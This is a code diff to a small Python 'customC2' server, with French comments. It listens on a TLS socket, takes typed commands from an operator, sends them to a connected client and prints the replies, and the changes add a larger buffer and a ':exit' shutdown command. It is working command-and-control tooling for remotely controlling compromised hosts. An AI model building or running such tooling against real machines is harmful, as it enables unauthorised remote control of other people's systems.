@@ -7,6 +7,8 @@ import ssl
 
 HOST = '0.0.0.0'
 PORT = 25566
+# taille des messages : 128kB max
+BUFFER_SIZE = 1024 * 128
 
 # Créer une socket TCP/IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -18,7 +20,7 @@ context =  ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 context.load_cert_chain(certfile="./chiffrement/python_ssl.pem",
                         keyfile="./chiffrement/python_ssl_priv.key")
 
-while sock:
+while True:
     print(f"[*] Listening to {HOST}:{PORT}...")
     conn, addr = sock.accept()
 
@@ -30,15 +32,15 @@ while sock:
         print(f"[+] Client connected : {addr}")
         while True:
             command = input("(customC2) $ ")
-            if command == "q" or command == "quit" or command == "exit":
-                connssl.sendall(command.encode())
-                reply = connssl.recv(1024)
+            if command == ":exit":
                 print('quitting console')
                 sock.shutdown(socket.SHUT_RDWR)
+                conn.shutdown(socket.SHUT_RDWR)
                 sock.close()
+                conn.close()
                 exit(0)
             connssl.sendall(command.encode())
-            reply = connssl.recv(1024)
+            reply = connssl.recv(BUFFER_SIZE)
             if not reply:
                 break
             print(reply.decode())
